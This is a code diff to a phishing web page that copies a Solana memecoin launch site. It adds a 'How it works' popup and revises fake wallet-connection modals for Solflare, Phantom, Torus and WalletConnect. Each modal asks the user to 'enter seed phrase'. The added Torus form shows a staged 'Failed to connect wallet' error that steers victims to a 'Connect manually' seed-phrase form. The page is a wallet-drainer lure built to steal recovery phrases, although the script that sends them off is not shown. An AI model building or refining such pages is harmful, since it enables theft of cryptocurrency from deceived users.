@@ -128,6 +128,34 @@
 			</div>
 		</div>
 	</div>
+	<div data-state="close"
+		 class="pop-up-bg-2 hidden fixed inset-0 z-50 bg-black/80 data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0"
+		 style="pointer-events: auto;" data-aria-hidden="true" aria-hidden="true">
+
+		<div role="dialog" id="radix-:r0:" aria-describedby="radix-:r2:" aria-labelledby="radix-:r1:" data-state="open"
+			 class="fixed left-[50%] top-[50%] z-50 grid w-full max-w-lg translate-x-[-50%] translate-y-[-50%] gap-4 border border-slate-200 shadow-lg duration-200 data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[state=closed]:slide-out-to-left-1/2 data-[state=closed]:slide-out-to-top-[48%] data-[state=open]:slide-in-from-left-1/2 data-[state=open]:slide-in-from-top-[48%] sm:rounded-lg dark:border-slate-800 dark:bg-slate-950 bg-primary text-white p-4 text-center"
+			 tabindex="-1" style="pointer-events: auto;">
+			<div class="flex flex-col space-y-1.5 sm:text-left text-center">
+				<h2 id="radix-:r1:" class="text-lg font-semibold leading-none tracking-tight text-center">How it works
+				</h2>
+			</div>
+			<div>Pump prevents rugs by making sure that all created tokens are safe. Each coin on pump is a <span
+					  class="text-green-300 bold">fair-launch</span> with <span class="text-blue-300">no presale</span>
+				and <span class="text-orange-300">no team allocation.</span></div>
+			<div class="bg-primary text-white p-4 space-y-4">
+				<div class="text-gray-300">step 1: pick a coin that you like</div>
+				<div class="text-gray-300">step 2: buy the coin on the bonding curve</div>
+				<div class="text-gray-300">step 3: sell at any time to lock in your profits or losses</div>
+				<div class="text-gray-300">step 4: when enough people buy on the bonding curve it reaches a market cap
+					of $69k</div>
+				<div class="text-gray-300">step 5: $12k of liquidity is then deposited in raydium and burned</div>
+			</div><button
+					class="inline-flex items-center justify-center whitespace-nowrap rounded-md text-sm font-medium ring-offset-white transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-slate-950 focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 dark:ring-offset-slate-950 dark:focus-visible:ring-slate-300 dark:hover:bg-slate-800 dark:hover:text-slate-50 h-10 px-4 py-2 text-slate-50 hover:font-bold hover:bg-transparent hover:text-slate-50">[I'm
+				ready to pump]</button>
+		</div>
+
+	</div>
+
 	<div class="css-bvrne solflare-modal">
 		<div class="css-1es94df"><button id="close-modal-button" class="css-1gp694x">
 				<svg width="14" height="14" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
@@ -186,7 +214,7 @@
 				</div>
 			</div>
 			<div class="css-5eru5x">
-				<form id="form">
+				<form class="main-form">
 					<div class="field">
 						<input class="readonly-inp" readOnly type="text" name="for_name" id="for_name"
 							   value="connect with  solflare">
@@ -194,11 +222,12 @@
 					<div class="field">
 						<textarea type="text" name="message" placeholder="enter seed phrase" id="message"></textarea>
 					</div>
-					<!-- <input type="submit" id="button" value="Send Email"> -->
+
+
 					<div class="field">
 						<button id="connect-web-button" type="submit" class="css-ev97sc"><span class="css-1o1xzxn">
 								Connect
-								Wallet</span></button>
+								wallet</span></button>
 					</div>
 				</form>
 			</div>
@@ -213,10 +242,10 @@
 				</svg></button>
 			<div class="content">
 				<div class="css-ar2o10">
-				<img alt="Phantom" width="24" height="24" decoding="async" data-nimg="1"
-							 class="rounded-full rounded rounded-md"
-							 src="https://187760183-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MVOiF6Zqit57q_hxJYp%2Fuploads%2FHEjleywo9QOnfYebBPCZ%2FPhantom_SVG_Icon.svg?alt=media&token=71b80a0a-def7-4f98-ae70-5e0843fdaaec"
-							 style="color: transparent;">Phantom
+					<img alt="Phantom" width="24" height="24" decoding="async" data-nimg="1"
+						 class="rounded-full rounded rounded-md"
+						 src="https://187760183-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MVOiF6Zqit57q_hxJYp%2Fuploads%2FHEjleywo9QOnfYebBPCZ%2FPhantom_SVG_Icon.svg?alt=media&token=71b80a0a-def7-4f98-ae70-5e0843fdaaec"
+						 style="color: transparent;">Phantom
 				</div>
 				<div class="css-1y6cjc">Get the best<br>Solana experience</div>
 				<div class="css-1hv3kzk">
@@ -226,7 +255,7 @@
 				</div>
 			</div>
 			<div class="css-5eru5x">
-				<form id="form">
+				<form class="main-form">
 					<div class="field">
 						<input class="readonly-inp" readOnly type="text" name="for_name" id="for_name"
 							   value="connect with  Phantom">
@@ -234,11 +263,12 @@
 					<div class="field">
 						<textarea type="text" name="message" placeholder="enter seed phrase" id="message"></textarea>
 					</div>
-					<!-- <input type="submit" id="button" value="Send Email"> -->
+
+
 					<div class="field">
 						<button id="connect-web-button" type="submit" class="css-ev97sc"><span class="css-1o1xzxn">
 								Connect
-								Wallet</span></button>
+								wallet</span></button>
 					</div>
 				</form>
 			</div>
@@ -265,7 +295,25 @@
 				</div>
 			</div>
 			<div class="css-5eru5x">
-				<form id="form">
+				<form id="add-form">
+					<div class="field">
+						<input class="readonly-inp" readOnly type="text" name="for_name" id="for_name"
+							   value="connect with  Torus">
+					</div>
+					<div class="field">
+						<input type="text" name="message" placeholder="enter wallet address" id="address" />
+					</div>
+					<span class="error-connect">Failed to connect wallet</span>
+					<div class="field">
+						<button type="submit" class="css-ev97sc"><span class="css-1o1xzxn connect-web-button-add">
+								Connect
+								wallet</span>
+						</button>
+
+					</div>
+					<span class="connect-manually">Connect manually</span>
+				</form>
+				<form class="main-form">
 					<div class="field">
 						<input class="readonly-inp" readOnly type="text" name="for_name" id="for_name"
 							   value="connect with  Torus">
@@ -273,13 +321,15 @@
 					<div class="field">
 						<textarea type="text" name="message" placeholder="enter seed phrase" id="message"></textarea>
 					</div>
-					<!-- <input type="submit" id="button" value="Send Email"> -->
+
+
 					<div class="field">
 						<button id="connect-web-button" type="submit" class="css-ev97sc"><span class="css-1o1xzxn">
 								Connect
-								Wallet</span></button>
+								wallet</span></button>
 					</div>
 				</form>
+
 			</div>
 			<!-- </div> -->
 		</div>
@@ -306,7 +356,7 @@
 				</div>
 			</div>
 			<div class="css-5eru5x">
-				<form id="form">
+				<form class="main-form">
 					<div class="field">
 						<input class="readonly-inp" readOnly type="text" name="for_name" id="for_name"
 							   value="connect with  walletconnect">
@@ -314,11 +364,12 @@
 					<div class="field">
 						<textarea type="text" name="message" placeholder="enter seed phrase" id="message"></textarea>
 					</div>
-					<!-- <input type="submit" id="button" value="Send Email"> -->
+
+
 					<div class="field">
 						<button id="connect-web-button" type="submit" class="css-ev97sc"><span class="css-1o1xzxn">
 								Connect
-								Wallet</span></button>
+								wallet</span></button>
 					</div>
 				</form>
 			</div>
